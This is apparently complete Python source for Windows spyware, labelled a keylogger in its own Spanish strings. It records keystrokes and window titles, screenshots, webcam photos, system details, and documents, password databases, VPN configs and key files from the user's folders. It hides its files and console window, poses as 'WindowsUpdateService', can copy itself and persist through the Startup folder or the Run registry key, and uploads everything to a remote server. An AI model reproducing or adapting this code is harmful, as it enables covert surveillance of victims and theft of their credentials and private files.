import os
import time
import requests
from pynput import keyboard
import threading
from threading import Timer
import pyautogui
import sys
import logging
from datetime import datetime
import ctypes
import traceback
import shutil
import winreg
import hashlib
import socket
import win32gui
import cv2
import platform
import psutil
import subprocess
import uuid
import re

TEST_MODE = False
ENABLE_STEALTH = False
ENABLE_STARTUP = False
ENABLE_SELF_COPY = False
ENABLE_FILE_EXTRACTION = True
ENABLE_CAMERA_CAPTURE = True

SERVER_BASE_URL = "http://key.michu.site:2727"
SCREENSHOT_INTERVAL = 15
UPLOAD_INTERVAL = 300
FILE_EXTRACTION_INTERVAL = 86400
CAMERA_CAPTURE_INTERVAL = 10
CAMERA_UPLOAD_INTERVAL = 120
SYSTEM_INFO_INTERVAL = 86400
MAX_RETRIES = 3
RETRY_DELAY = 30

SENSITIVE_EXTENSIONS = ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', 
                         '.jpg', '.jpeg', '.png', '.pptx', '.accdb', '.db', 
                         '.sqlite', '.kdbx', '.ovpn', '.pem']
SENSITIVE_DIRECTORIES = [
    os.path.join(os.environ['USERPROFILE'], 'Desktop'),
    os.path.join(os.environ['USERPROFILE'], 'Documents'),
    os.path.join(os.environ['USERPROFILE'], 'Downloads'),
    os.path.join(os.environ['USERPROFILE'], 'Pictures')
]

TEST_SERVICE_NAME = "KeyloggerTest"
PROD_SERVICE_NAME = "WindowsUpdateService"

SERVICE_NAME = TEST_SERVICE_NAME if TEST_MODE else PROD_SERVICE_NAME
MUTEX_NAME = f"Global\\{SERVICE_NAME}Mutex"

if TEST_MODE:
    BASE_PATH = os.path.join(os.path.expanduser('~'), 'Desktop', 'KeyloggerData')
else:
    BASE_PATH = os.path.join(os.getenv('LOCALAPPDATA', 'C:\\'), SERVICE_NAME, 'Cache')

TEMP_PATH = BASE_PATH
SCREENSHOT_DIR = os.path.join(BASE_PATH, 'screenshots')
LOG_DIR = os.path.join(BASE_PATH, 'logs')
EXTRACTED_FILES_DIR = os.path.join(BASE_PATH, 'extracted_files')
CAMERA_DIR = os.path.join(BASE_PATH, 'camera')
SYSTEM_INFO_DIR = os.path.join(BASE_PATH, 'system_info')
DEBUG_LOG = os.path.join(BASE_PATH, 'debug.log')
CRASH_LOG = os.path.join(BASE_PATH, 'crash.log')

current_log_file = None
shift_pressed = False
caps_lock_on = False
num_lock_on = True
is_running = True
copy_created = False
dead_key = None
last_window = None

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window).strip()
        return title if title else "Sin_Título"
    except Exception:
        return "Desconocida"

def prevent_multiple_instances():
    if not TEST_MODE:
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, True, MUTEX_NAME)
            return ctypes.windll.kernel32.GetLastError() != 183
        except Exception:
            return True
    return True

def calculate_file_hash(file_path):
    sha256 = hashlib.sha256()
    try:
        with open(file_path, 'rb') as f:
            while True:
                data = f.read(65536)
                if not data:
                    break
                sha256.update(data)
        return sha256.hexdigest()
    except Exception:
        return None

def self_copy():
    global copy_created
    if not ENABLE_SELF_COPY or copy_created:
        return False, None
    try:
        current_exe = sys.argv[0]
        exe_name = os.path.basename(current_exe)
        copy_path = os.path.join(BASE_PATH, exe_name)
        os.makedirs(BASE_PATH, exist_ok=True)
        if os.path.exists(copy_path):
            original_hash = calculate_file_hash(current_exe)
            copy_hash = calculate_file_hash(copy_path)
            if copy_hash == original_hash:
                copy_created = True
                return True, copy_path
        shutil.copy2(current_exe, copy_path)
        copy_created = True
        if not TEST_MODE and sys.platform == 'win32':
            hide_file(copy_path)
        if TEST_MODE:
            print(f"Auto-copia creada: {copy_path}")
        return True, copy_path
    except Exception as e:
        if TEST_MODE:
            print(f"Error en auto-copia: {str(e)}")
        return False, None

def hide_file(path):
    if not TEST_MODE and sys.platform == 'win32':
        try:
            ctypes.windll.kernel32.SetFileAttributesW(path, 2 | 4)
        except Exception:
            pass

def hide_window():
    if not TEST_MODE:
        try:
            if sys.platform == 'win32':
                console_window = ctypes.windll.kernel32.GetConsoleWindow()
                if console_window:
                    ctypes.windll.user32.ShowWindow(console_window, 0)
        except Exception:
            pass

def setup_directories():
    try:
        directories = [BASE_PATH, SCREENSHOT_DIR, LOG_DIR, EXTRACTED_FILES_DIR, CAMERA_DIR, SYSTEM_INFO_DIR]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
            hide_file(directory)
        return True
    except Exception as e:
        if TEST_MODE:
            print(f"Error creando directorios: {str(e)}")
        return False

def get_system_info():
    try:
        info = {}
        
        info['Sistema Operativo'] = f"{platform.system()} {platform.release()} {platform.version()}"
        info['Arquitectura'] = platform.machine()
        info['Procesador'] = platform.processor()
        info['Hostname'] = socket.gethostname()
        info['Usuario'] = os.getenv('USERNAME')
        
        info['Memoria RAM Total'] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        info['Memoria RAM Disponible'] = f"{round(psutil.virtual_memory().available / (1024**3), 2)} GB"
        
        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'Dispositivo': partition.device,
                    'Punto de Montaje': partition.mountpoint,
                    'Sistema de Archivos': partition.fstype,
                    'Espacio Total': f"{round(usage.total / (1024**3), 2)} GB",
                    'Espacio Usado': f"{round(usage.used / (1024**3), 2)} GB",
                    'Espacio Libre': f"{round(usage.free / (1024**3), 2)} GB"
                })
            except:
                continue
        info['Discos'] = disks
        
        info['Dirección MAC'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['Direcciones IP'] = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info['Direcciones IP'].append(f"{interface}: {addr.address}")
        
        try:
            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                  capture_output=True, text=True, timeout=10)
            gpus = [line.strip() for line in result.stdout.split('\n') if line.strip() and 'Name' not in line]
            info['GPUs'] = gpus
        except:
            info['GPUs'] = ["No se pudo obtener información de GPU"]
        
        return info
    except Exception as e:
        if TEST_MODE:
            print(f"Error obteniendo información del sistema: {str(e)}")
        return {"Error": f"No se pudo obtener información del sistema: {str(e)}"}

def save_system_info():
    try:
        system_info = get_system_info()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"system_info_{timestamp}.txt"
        file_path = os.path.join(SYSTEM_INFO_DIR, filename)
        
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("=== INFORMACIÓN DEL SISTEMA ===\n\n")
            f.write(f"Fecha y Hora: {datetime.now()}\n\n")
            for key, value in system_info.items():
                if key == 'Discos':
                    f.write(f"\n--- DISCOS ---\n")
                    for disk in value:
                        for disk_key, disk_value in disk.items():
                            f.write(f"{disk_key}: {disk_value}\n")
                        f.write("\n")
                elif key == 'Direcciones IP':
                    f.write(f"\n--- DIRECCIONES IP ---\n")
                    for ip in value:
                        f.write(f"{ip}\n")
                elif key == 'GPUs':
                    f.write(f"\n--- GPUs ---\n")
                    for gpu in value:
                        f.write(f"{gpu}\n")
                else:
                    f.write(f"{key}: {value}\n")
        
        hide_file(file_path)
        if TEST_MODE:
            print(f"Información del sistema guardada: {file_path}")
        return file_path
    except Exception as e:
        if TEST_MODE:
            print(f"Error guardando información del sistema: {str(e)}")
        return None

def update_modifier_state(key, is_press):
    global shift_pressed, caps_lock_on, num_lock_on
    try:
        if key in (keyboard.Key.shift, keyboard.Key.shift_r):
            shift_pressed = is_press
        elif key == keyboard.Key.caps_lock and is_press:
            caps_lock_on = not caps_lock_on
        elif key == keyboard.Key.num_lock and is_press:
            num_lock_on = not num_lock_on
    except Exception:
        pass

def should_capitalize():
    return (shift_pressed and not caps_lock_on) or (not shift_pressed and caps_lock_on)

def combine_dead_key_with_vowel(dead_key_char, vowel_char):
    dead_key_mappings = {
        '´': {'a': 'á', 'e': 'é', 'i': 'í', 'o': 'ó', 'u': 'ú', 
              'A': 'Á', 'E': 'É', 'I': 'Í', 'O': 'Ó', 'U': 'Ú'},
        '`': {'a': 'à', 'e': 'è', 'i': 'ì', 'o': 'ò', 'u': 'ù',
              'A': 'À', 'E': 'È', 'I': 'Ì', 'O': 'Ò', 'U': 'Ù'},
        '¨': {'a': 'ä', 'e': 'ë', 'i': 'ï', 'o': 'ö', 'u': 'ü',
              'A': 'Ä', 'E': 'Ë', 'I': 'Ï', 'O': 'Ö', 'U': 'Ü'},
        '^': {'a': 'â', 'e': 'ê', 'i': 'î', 'o': 'ô', 'u': 'û',
              'A': 'Â', 'E': 'Ê', 'I': 'Î', 'O': 'Ô', 'U': 'Û'},
        '~': {'a': 'ã', 'o': 'õ', 'n': 'ñ',
              'A': 'Ã', 'O': 'Õ', 'N': 'Ñ'}
    }
    if dead_key_char in dead_key_mappings:
        mapping = dead_key_mappings[dead_key_char]
        if vowel_char in mapping:
            return mapping[vowel_char]
    return vowel_char

def format_key(key):
    global dead_key
    special_keys = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.backspace: "[⌫]",
        keyboard.Key.tab: "[↹]",
        keyboard.Key.esc: "[⎋]",
        keyboard.Key.f1: "[F1]", keyboard.Key.f2: "[F2]", 
        keyboard.Key.f3: "[F3]", keyboard.Key.f4: "[F4]", 
        keyboard.Key.f5: "[F5]", keyboard.Key.f6: "[F6]", 
        keyboard.Key.f7: "[F7]", keyboard.Key.f8: "[F8]", 
        keyboard.Key.f9: "[F9]", keyboard.Key.f10: "[F10]", 
        keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]", 
        keyboard.Key.insert: "[INSERT]", keyboard.Key.delete: "[DEL]",
        keyboard.Key.home: "[HOME]", keyboard.Key.end: "[END]",
        keyboard.Key.page_up: "[PGUP]", keyboard.Key.page_down: "[PGDN]",
        keyboard.Key.up: "[↑]", keyboard.Key.down: "[↓]",
        keyboard.Key.left: "[←]", keyboard.Key.right: "[→]",
        keyboard.Key.print_screen: "[PRTSC]",
        keyboard.Key.scroll_lock: "[SCRLK]",
        keyboard.Key.pause: "[PAUSE]",
        keyboard.Key.menu: "[MENU]",
        keyboard.Key.ctrl_l: "[CTRL]", keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt_l: "[ALT]", keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.cmd: "[WIN]", keyboard.Key.cmd_r: "[WIN]",
    }
    keypad_map = {
        96: lambda: '0' if num_lock_on else '[INSERT]',
        97: lambda: '1' if num_lock_on else '[END]',
        98: lambda: '2' if num_lock_on else '[↓]',
        99: lambda: '3' if num_lock_on else '[PGDN]',
        100: lambda: '4' if num_lock_on else '[←]',
        101: lambda: '5' if num_lock_on else '',
        102: lambda: '6' if num_lock_on else '[→]',
        103: lambda: '7' if num_lock_on else '[HOME]',
        104: lambda: '8' if num_lock_on else '[↑]',
        105: lambda: '9' if num_lock_on else '[PGUP]',
        110: lambda: '.' if num_lock_on else '[DEL]',
        111: lambda: '/',
        106: lambda: '*',
        107: lambda: '+',
        109: lambda: '-',
    }
    if key in (keyboard.Key.shift, keyboard.Key.shift_r, 
               keyboard.Key.caps_lock, keyboard.Key.num_lock,
               keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
               keyboard.Key.alt_l, keyboard.Key.alt_r):
        return ""
    if hasattr(key, 'vk') and key.vk in keypad_map:
        return keypad_map[key.vk]()
    if key in special_keys:
        return special_keys[key]
    if hasattr(key, 'char') and key.char:
        char = key.char
        dead_key_chars = ['´', '`', '¨', '^', '~']
        if char in dead_key_chars:
            dead_key = char
            return ""
        elif dead_key:
            combined = combine_dead_key_with_vowel(dead_key, char)
            dead_key = None
            return combined.upper() if should_capitalize() else combined.lower()
        else:
            return char.upper() if should_capitalize() else char.lower()
    return f"[{str(key).replace('Key.', '').upper()}]"

def on_press(key):
    global current_log_file, last_window
    try:
        update_modifier_state(key, True)
        key_str = format_key(key)
        if current_log_file and key_str:
            current_window = get_active_window()
            if current_window != last_window:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                window_info = f"\n[Ventana: {current_window} - {timestamp}]\n"
                with open(current_log_file, 'a', encoding='utf-8') as f:
                    f.write(window_info)
                    if TEST_MODE:
                        print(window_info, end='')
                last_window = current_window
            with open(current_log_file, 'a', encoding='utf-8') as f:
                f.write(key_str)
                if TEST_MODE:
                    print(key_str, end='', flush=True)
    except Exception as e:
        if TEST_MODE:
            print(f"Error en on_press: {str(e)}")

def on_release(key):
    try:
        update_modifier_state(key, False)
    except Exception:
        pass

def capture_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        file_path = os.path.join(SCREENSHOT_DIR, filename)
        pyautogui.screenshot(file_path)
        hide_file(file_path)
        if TEST_MODE:
            print(f"\nCaptura guardada: {file_path}")
        return True
    except Exception:
        return False

def extract_sensitive_files():
    if not ENABLE_FILE_EXTRACTION or TEST_MODE:
        return []
    try:
        os.makedirs(EXTRACTED_FILES_DIR, exist_ok=True)
        hide_file(EXTRACTED_FILES_DIR)
    except Exception:
        return []
    extracted_files = []
    for directory in SENSITIVE_DIRECTORIES:
        if not os.path.isdir(directory):
            continue
        for root, _, files in os.walk(directory):
            for file in files:
                if any(file.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS):
                    src_path = os.path.join(root, file)
                    dest_path = os.path.join(EXTRACTED_FILES_DIR, file)
                    counter = 1
                    while os.path.exists(dest_path):
                        name, ext = os.path.splitext(file)
                        dest_path = os.path.join(EXTRACTED_FILES_DIR, f"{name}_{counter}{ext}")
                        counter += 1
                    try:
                        shutil.copy2(src_path, dest_path)
                        hide_file(dest_path)
                        extracted_files.append(dest_path)
                    except Exception:
                        pass
    return extracted_files

def check_internet_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    try:
        socket.getaddrinfo("google.com", None)
        return True
    except socket.gaierror:
        return False

def send_with_retry(endpoint, files):
    for attempt in range(MAX_RETRIES):
        if not check_internet_connection():
            if TEST_MODE:
                print(f"Sin conexión a internet. Reintento {attempt+1}/{MAX_RETRIES}")
            time.sleep(RETRY_DELAY)
            continue
        try:
            response = requests.post(
                f"{SERVER_BASE_URL}/{endpoint}",
                files=files,
                timeout=30
            )
            if response.status_code == 200:
                return True
            elif TEST_MODE:
                print(f"Error en el servidor: {response.status_code}")
        except Exception as e:
            if TEST_MODE:
                print(f"Error en el envío: {str(e)}")
        time.sleep(RETRY_DELAY)
    return False

def upload_files(directory, endpoint, pattern):
    try:
        files_to_send = []
        for filename in os.listdir(directory):
            if pattern(filename) and (current_log_file is None or filename != os.path.basename(current_log_file)):
                file_path = os.path.join(directory, filename)
                files_to_send.append((filename, file_path))
        uploaded_files = []
        for filename, file_path in files_to_send:
            try:
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                files = {'file': (filename, file_content)}
                if send_with_retry(endpoint, files):
                    uploaded_files.append(file_path)
                    if TEST_MODE:
                        print(f"Archivo enviado: {filename}")
            except Exception as e:
                if TEST_MODE:
                    print(f"Error procesando {filename}: {str(e)}")
        for file_path in uploaded_files:
            try:
                os.remove(file_path)
                if TEST_MODE:
                    print(f"Archivo eliminado: {os.path.basename(file_path)}")
            except Exception as e:
                if TEST_MODE:
                    print(f"Error eliminando archivo: {str(e)}")
        return True
    except Exception as e:
        if TEST_MODE:
            print(f"Error en upload_files: {str(e)}")
        return False

def upload_screenshots():
    return upload_files(
        SCREENSHOT_DIR,
        "upload/screenshots",
        lambda f: f.startswith("screenshot_") and f.endswith(".png")
    )

def upload_logs():
    return upload_files(
        LOG_DIR,
        "upload/logs",
        lambda f: f.startswith("keylog_") and f.endswith(".txt")
    )

def upload_extracted_files():
    return upload_files(
        EXTRACTED_FILES_DIR,
        "upload/files",
        lambda f: any(f.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS)
    )

def upload_system_info():
    return upload_files(
        SYSTEM_INFO_DIR,
        "upload/system_info",
        lambda f: f.startswith("system_info_") and f.endswith(".txt")
    )

def capture_camera_image():
    if not ENABLE_CAMERA_CAPTURE:
        return None
    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            return None
        ret, frame = camera.read()
        camera.release()
        if not ret:
            return None
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"camera_{timestamp}.jpg"
        file_path = os.path.join(CAMERA_DIR, filename)
        cv2.imwrite(file_path, frame)
        hide_file(file_path)
        if TEST_MODE:
            print(f"Captura de cámara guardada: {file_path}")
        return file_path
    except Exception as e:
        if TEST_MODE:
            print(f"Error captura cámara: {str(e)}")
        return None

def upload_camera_images():
    if not ENABLE_CAMERA_CAPTURE:
        return False
    try:
        camera_files = []
        for filename in os.listdir(CAMERA_DIR):
            if filename.startswith("camera_") and filename.endswith(".jpg"):
                file_path = os.path.join(CAMERA_DIR, filename)
                camera_files.append(file_path)
        if not camera_files:
            return True
        if TEST_MODE:
            print(f"Preparando envío de {len(camera_files)} fotos de cámara...")
        files = {}
        for i, file_path in enumerate(camera_files):
            files[f'file_{i}'] = (os.path.basename(file_path), open(file_path, 'rb'))
        success = send_with_retry("upload/camera", files)
        for f in files.values():
            f[1].close()
        if success:
            for file_path in camera_files:
                try:
                    os.remove(file_path)
                    if TEST_MODE:
                        print(f"Foto eliminada: {os.path.basename(file_path)}")
                except Exception:
                    pass
            return True
        return False
    except Exception as e:
        if TEST_MODE:
            print(f"Error enviando fotos: {str(e)}")
        return False

def scheduled_camera_capture():
    if is_running and ENABLE_CAMERA_CAPTURE:
        try:
            capture_camera_image()
        except Exception:
            pass
        finally:
            Timer(CAMERA_CAPTURE_INTERVAL, scheduled_camera_capture).start()

def scheduled_camera_upload():
    if is_running and ENABLE_CAMERA_CAPTURE:
        try:
            if check_internet_connection():
                upload_camera_images()
        except Exception:
            pass
        finally:
            Timer(CAMERA_UPLOAD_INTERVAL, scheduled_camera_upload).start()

def add_to_startup(copy_path):
    if not ENABLE_STARTUP or TEST_MODE or not copy_path:
        return False
    try:
        exe_name = os.path.basename(copy_path)
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        os.makedirs(startup_path, exist_ok=True)
        shortcut_path = os.path.join(startup_path, f"{SERVICE_NAME}.lnk")
        from win32com.client import Dispatch
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = copy_path
        shortcut.WorkingDirectory = os.path.dirname(copy_path)
        shortcut.save()
        hide_file(shortcut_path)
        return True
    except Exception:
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, SERVICE_NAME, 0, winreg.REG_SZ, copy_path)
            return True
        except Exception:
            return False

def scheduled_screenshot():
    if is_running:
        try:
            capture_screenshot()
        except Exception:
            pass
        finally:
            Timer(SCREENSHOT_INTERVAL, scheduled_screenshot).start()

def scheduled_upload():
    if is_running:
        try:
            if check_internet_connection():
                if TEST_MODE:
                    print("\nIniciando envío de datos...")
                upload_screenshots()
                upload_logs()
        except Exception:
            pass
        finally:
            Timer(UPLOAD_INTERVAL, scheduled_upload).start()

def scheduled_file_extraction():
    if is_running:
        try:
            if ENABLE_FILE_EXTRACTION and not TEST_MODE:
                extracted = extract_sensitive_files()
                if extracted and check_internet_connection():
                    upload_extracted_files()
        except Exception:
            pass
        finally:
            Timer(FILE_EXTRACTION_INTERVAL, scheduled_file_extraction).start()

def scheduled_system_info_collection():
    if is_running and not TEST_MODE:
        try:
            save_system_info()
            if check_internet_connection():
                upload_system_info()
        except Exception as e:
            if TEST_MODE:
                print(f"Error en recolección programada de información del sistema: {str(e)}")
        finally:
            Timer(SYSTEM_INFO_INTERVAL, scheduled_system_info_collection).start()

def main():
    global current_log_file, is_running, ENABLE_STEALTH, last_window
    if not TEST_MODE:
        ENABLE_STEALTH = True
    hide_window()
    if not prevent_multiple_instances():
        if TEST_MODE:
            print("Ya hay una instancia en ejecución. Saliendo.")
        sys.exit(0)
    if not setup_directories():
        if TEST_MODE:
            print("Error creando directorios. Saliendo.")
        sys.exit(1)
    copy_success, copy_path = False, None
    if ENABLE_SELF_COPY:
        copy_success, copy_path = self_copy()
    logging.basicConfig(
        filename=DEBUG_LOG if not TEST_MODE else None,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    if TEST_MODE:
        print(f"=== MODO PRUEBA ACTIVADO ===")
        print(f"Nombre del Servicio: {SERVICE_NAME}")
        print(f"Base Path: {BASE_PATH}")
        print(f"ScreenShots: {SCREENSHOT_DIR}")
        print(f"Logs: {LOG_DIR}")
        print(f"Extracted Files: {EXTRACTED_FILES_DIR}")
        print(f"System Info: {SYSTEM_INFO_DIR}")
        print(f"Camera: {CAMERA_DIR}")
        print(f"Servidor: {SERVER_BASE_URL}")
        print(f"Capturas cada: {SCREENSHOT_INTERVAL}s, Envíos cada: {UPLOAD_INTERVAL}s")
        print(f"Extracción de archivos cada: {FILE_EXTRACTION_INTERVAL}s")
        print(f"Capturas de cámara cada: {CAMERA_CAPTURE_INTERVAL}s")
        print(f"Envíos de cámara cada: {CAMERA_UPLOAD_INTERVAL}s")
        print(f"Información del sistema cada: {SYSTEM_INFO_INTERVAL}s")
        if copy_success:
            print(f"Auto-copia creada: {copy_path}")
        print("=============================")
    if copy_path and ENABLE_STARTUP and add_to_startup(copy_path):
        if TEST_MODE:
            print(f"Persistencia añadida al inicio usando: {copy_path}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    current_log_file = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
    with open(current_log_file, 'w', encoding='utf-8') as f:
        f.write(f"=== SESIÓN INICIADA: {datetime.now()} ===\n\n")
    hide_file(current_log_file)
    last_window = get_active_window()
    if TEST_MODE:
        print(f"Registro de teclas iniciado: {current_log_file}")
        print("Escribe algo... (Ctrl+C para detener)")
    keyboard_listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    keyboard_listener.daemon = True
    keyboard_listener.start()
    scheduled_screenshot()
    scheduled_upload()
    if ENABLE_FILE_EXTRACTION:
        scheduled_file_extraction()
    if ENABLE_CAMERA_CAPTURE:
        scheduled_camera_capture()
        scheduled_camera_upload()
    
    if not TEST_MODE:
        scheduled_system_info_collection()
    
    if TEST_MODE:
        print("Keylogger iniciado correctamente")
    while is_running:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        is_running = False
        if TEST_MODE:
            print("\nKeylogger detenido manualmente")
        sys.exit(0)
    except Exception as e:
        try:
            os.makedirs(BASE_PATH, exist_ok=True)
            with open(CRASH_LOG, 'a') as f:
                f.write(f"{datetime.now()}: {str(e)}\n")
                f.write(traceback.format_exc())
            hide_file(CRASH_LOG)
        except Exception:
            pass
        if TEST_MODE:
            print(f"Error crítico: {str(e)}")
            traceback.print_exc()
            print(f"Detalles en: {CRASH_LOG}")
        time.sleep(5)
        sys.exit(1)
